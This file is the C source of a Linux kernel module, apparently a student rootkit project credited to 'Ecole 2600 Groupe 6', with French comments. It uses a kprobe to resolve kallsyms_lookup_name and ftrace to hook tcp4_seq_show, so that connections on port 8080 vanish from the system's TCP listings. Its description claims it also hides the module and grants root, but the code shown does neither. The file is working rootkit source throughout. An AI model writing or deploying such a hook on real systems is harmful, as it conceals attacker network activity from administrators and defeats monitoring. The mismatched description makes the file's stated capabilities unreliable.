#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <net/tcp.h>

// Licence GPL obligatoire pour la conformité avec le noyau Linux
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ecole 2600 Groupe 6");
MODULE_DESCRIPTION("Module permettant de masquer un LKM et d'octroyer les privilèges root.");
MODULE_VERSION("0.1");

// Vérification de la version minimale prise en charge
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)
#error "Ce module est compatible uniquement avec les versions de noyau 5.7 et supérieures."
#endif

// Désactivation des optimisations pour éviter les appels récursifs
#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

// Utilisation de kprobes pour résoudre les adresses
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

// Prototype de la fonction kallsyms_lookup_name
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name;

// Structure décrivant un hook avec ftrace
struct ftrace_hook {
    const char *name;     // Nom de la fonction à intercepter
    void *function;       // Nouvelle fonction à exécuter
    void *original;       // Pointeur vers la fonction originale
    unsigned long address; // Adresse de la fonction
    struct ftrace_ops ops; // Options pour ftrace
};

// Macro pour définir facilement un hook
#define HOOK(_name, _function, _original) \
    {                                     \
        .name = (_name),                  \
        .function = (_function),          \
        .original = (_original),          \
    }

// Fonction pour résoudre l'adresse d'un hook en utilisant `kallsyms_lookup_name`
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    // Initialisation de kallsyms_lookup_name via kprobe
    if (!kallsyms_lookup_name) {
        int ret = register_kprobe(&kp);
        if (ret < 0) {
            printk(KERN_ERR "[-] rootkit: Échec de kprobe : %d\n", ret);
            return ret;
        }
        kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
        unregister_kprobe(&kp);

        if (!kallsyms_lookup_name) {
            printk(KERN_ERR "[-] rootkit: Échec de kallsyms_lookup_name\n");
            return -ENOENT;
        }
    }

    // Résolution de l'adresse de la fonction
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "[-] rootkit: Échec de la résolution de l'adresse pour %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long *)hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long *)hook->original) = hook->address;
#endif
    printk(KERN_INFO "[+] rootkit: Résolution d'adresse réussie pour %s : %p\n", hook->name, (void *)hook->address);
    return 0;
}

// Fonction de redirection d'exécution vers une nouvelle fonction
static int notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;

    return 0;
}

// Fonction pour installer un hook
int fh_install_hook(struct ftrace_hook *hook)
{
    int err;

    err = fh_resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_ERR "[-] rootkit: ftrace_set_filter_ip() échoué : %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_ERR "[-] rootkit: register_ftrace_function() échoué : %d\n", err);
        return err;
    }

    return 0;
}

// Fonction pour désinstaller un hook
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk(KERN_ERR "[-] rootkit: unregister_ftrace_function() échoué : %d\n", err);

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk(KERN_ERR "[-] rootkit: ftrace_set_filter_ip() échoué : %d\n", err);
}

// Installe plusieurs hooks
int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }

    return 0;

error:
    while (i != 0)
        fh_remove_hook(&hooks[--i]);

    return err;
}

// Supprime plusieurs hooks
void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}

// Hook spécifique à `tcp4_seq_show` pour masquer les connexions sur un port donné
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;

    if (sk != NULL) {
        if (sk->sk_num == 8080) { // Port 8080 en hexadécimal : 0x1f90
            printk(KERN_INFO "[+] rootkit: Masquage de la connexion sur le port 8080\n");
            return 0;
        }
    }

    return orig_tcp4_seq_show(seq, v);
}

// Tableau des hooks à installer
static struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

// Fonction d'initialisation du module
static int __init rootkit_init(void)
{
    int err;

    printk(KERN_INFO "[+] rootkit: Initialisation...\n");
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        printk(KERN_ERR "[-] rootkit: Échec de l'installation des hooks\n");
        return err;
    }

    printk(KERN_INFO "[+] rootkit: Chargé avec succès\n");
    return 0;
}

// Fonction de nettoyage du module
static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "[+] rootkit: Déchargé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
